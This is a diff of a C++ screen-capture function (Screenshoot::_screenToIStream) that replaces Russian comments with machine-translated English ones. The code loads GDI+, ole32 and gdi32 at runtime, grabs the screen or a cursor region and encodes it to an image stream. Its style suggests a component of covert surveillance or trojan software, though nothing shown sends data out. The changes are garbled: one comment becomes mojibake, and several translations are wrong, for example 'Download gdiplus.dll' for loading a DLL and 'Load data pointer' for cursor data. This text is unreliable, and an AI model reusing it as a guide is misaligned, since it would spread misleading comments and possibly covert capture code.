@@ -12,7 +12,7 @@
 #include "..\common\gui.h"
 #include "..\common\wsocket.h"
 
-//Список прототипов испортируемых функций.
+//List of prototype isportiruemyh functions.
 typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPLUSSTARTUP)(ULONG_PTR *token, const Gdiplus::GdiplusStartupInput *input, Gdiplus::GdiplusStartupOutput *output);
 typedef void     (WINGDIPAPI *GDIPLUSSHUTDOWN)(ULONG_PTR token);
 typedef Gdiplus::GpStatus (WINGDIPAPI *GDIPCREATEBITMAPFROMHBITMAP)(HBITMAP hbm, HPALETTE hpal, Gdiplus::GpBitmap** bitmap);
@@ -53,7 +53,7 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
   Gdiplus::GdiplusStartupInput startupInput;
   ULONG_PTR token;
 
-  //Загрузка gdiplus.dll.
+  //Download gdiplus.dll.
   gdiPlusDll = CWA(kernel32, LoadLibraryA)("gdiplus.dll");
   GDIPLUSSTARTUP              gpStartup                 = (GDIPLUSSTARTUP)CWA(kernel32, GetProcAddress)(gdiPlusDll,              "GdiplusStartup");
   GDIPLUSSHUTDOWN             gpShutdown                = (GDIPLUSSHUTDOWN)CWA(kernel32, GetProcAddress)(gdiPlusDll,             "GdiplusShutdown");
@@ -68,7 +68,7 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
     goto END;
   }
 
-  //Загрузка ole32.dll.
+  //Download ole32.dll.
   ole32Dll = CWA(kernel32, LoadLibraryA)("ole32.dll");
   CREATESTREAMONHGLOBAL createStreamOnHGlobal = (CREATESTREAMONHGLOBAL)CWA(kernel32, GetProcAddress)(ole32Dll, "CreateStreamOnHGlobal");
   if(createStreamOnHGlobal == NULL)
@@ -77,7 +77,8 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
     goto END;
   }
   
-  //Загрузка gdi32.dll.
+  //Р—Р°РіСЂСѓР·РєР° gdi32.dll.
+
   gdi32Dll = CWA(kernel32, LoadLibraryA)("gdi32.dll");
   CREATEDCW              createDcW              = (CREATEDCW)CWA(kernel32, GetProcAddress)(gdi32Dll,              "CreateDCW");
   CREATECOMPATIBLEDC     createCompatibleDC     = (CREATECOMPATIBLEDC)CWA(kernel32, GetProcAddress)(gdi32Dll,     "CreateCompatibleDC");
@@ -93,9 +94,9 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
     goto END;
   }
 
-  //////////////////////////////////////////////////////////////////////////////////////////////////
-  // Инициализация
-  //////////////////////////////////////////////////////////////////////////////////////////////////
+  //////////////////////////////////////////////////// //////////////////////////////////////////////
+  //В Initialization
+  //////////////////////////////////////////////////// //////////////////////////////////////////////
 
   startupInput.GdiplusVersion = 1;
   startupInput.DebugEventCallback       = NULL;
@@ -110,14 +111,14 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
       HDC memDc = createCompatibleDC(dc);
       if(memDc != NULL)
       {
-        //Загружаем данные курсора.
+        //Load data pointer.
         POINT cursorPos;
         ICONINFO cursorInfo;
         HCURSOR cursor = Gui::_loadSharedCursor(NULL, MAKEINTRESOURCEW(OCR_NORMAL));
         if(cursor != NULL && (CWA(user32, GetIconInfo)(cursor, &cursorInfo) == FALSE || CWA(user32, GetCursorPos)(&cursorPos) == FALSE))cursor = NULL;
-        if(cursor == NULL)rectSize = 0; //Переходим в режим рисования всего скрина.
+        if(cursor == NULL)rectSize = 0; //Enters the drawing of the screenshot.
         
-        //Получем размер изображения.
+        //Get the size of the image.
         int width, height;
         if(rectSize != 0)
         {
@@ -130,14 +131,14 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
           height = getDeviceCaps(dc, VERTRES);
         }
         
-        //Создаем изображение.
+        //Create an image.
         HBITMAP bitmap = createCompatibleBitmap(dc, width, height);
         if(bitmap != NULL)
         {
           HBITMAP oldBitmap = (HBITMAP)selectObject(memDc, bitmap);
           if(oldBitmap != NULL)
           {
-            //Копируем изображение.
+            //Copy the image.
             int x = 0, y = 0;
             if(rectSize != 0)
             {
@@ -149,7 +150,7 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
 
             if(bitBlt(memDc, 0, 0, width, height, dc, x, y, SRCCOPY | CAPTUREBLT) != FALSE)
             {
-              //Рисуем курсор.
+              //Draw the cursor.
               if(cursor != NULL)
               {
                 if((x = cursorPos.x - cursorInfo.xHotspot) < 0)x = 0;
@@ -157,11 +158,11 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
                 CWA(user32, DrawIcon)(memDc, x, y, cursor);
               }
 
-              //Конвертируем в Stream.
+              //Convert to a Stream.
               Gdiplus::GpBitmap *gpBitmap = NULL;
               if(gpCreateBitmapFromHBitmap(bitmap, NULL, &gpBitmap) == Gdiplus::Ok && gpBitmap != NULL)
               {
-                //Поиск нужного кодека.
+                //Searching for the desired codec.
                 UINT countOfEncoders = 0;
                 UINT sizeOfEncoders  = 0;
                 Gdiplus::ImageCodecInfo* imageCodecInfo;
@@ -183,14 +184,14 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
                   }
                   Mem::free(imageCodecInfo);
 
-                  //Кодек найден.
+                  //Codec found.
                   if(countOfEncoders == 0 && createStreamOnHGlobal(NULL, TRUE, &stream) == S_OK && stream != NULL)
                   {
-                    //Опции Кодека
+                    //Codec Options
                     Gdiplus::EncoderParameters params;
                     params.Count = 0;
 
-                    //Качество картинки
+                    //Image quality
                     if(quality > 0)
                     {
                       Mem::_copy(&params.Parameter[params.Count].Guid, &encoderQuality, sizeof(GUID));
@@ -200,7 +201,7 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
                       params.Count++;
                     }
 
-                    //Сохраняем.
+                    //Save.
                     if(gpSaveImageToStream(gpBitmap, stream, &encoderClsid, &params) != Gdiplus::Ok)
                     {
                       stream->Release();
@@ -208,7 +209,7 @@ IStream *Screenshoot::_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect
                     }
                     else
                     {
-                      //Финал.
+                      //Final.
                       LARGE_INTEGER li;
                       li.HighPart = 0;
                       li.LowPart  = 0;
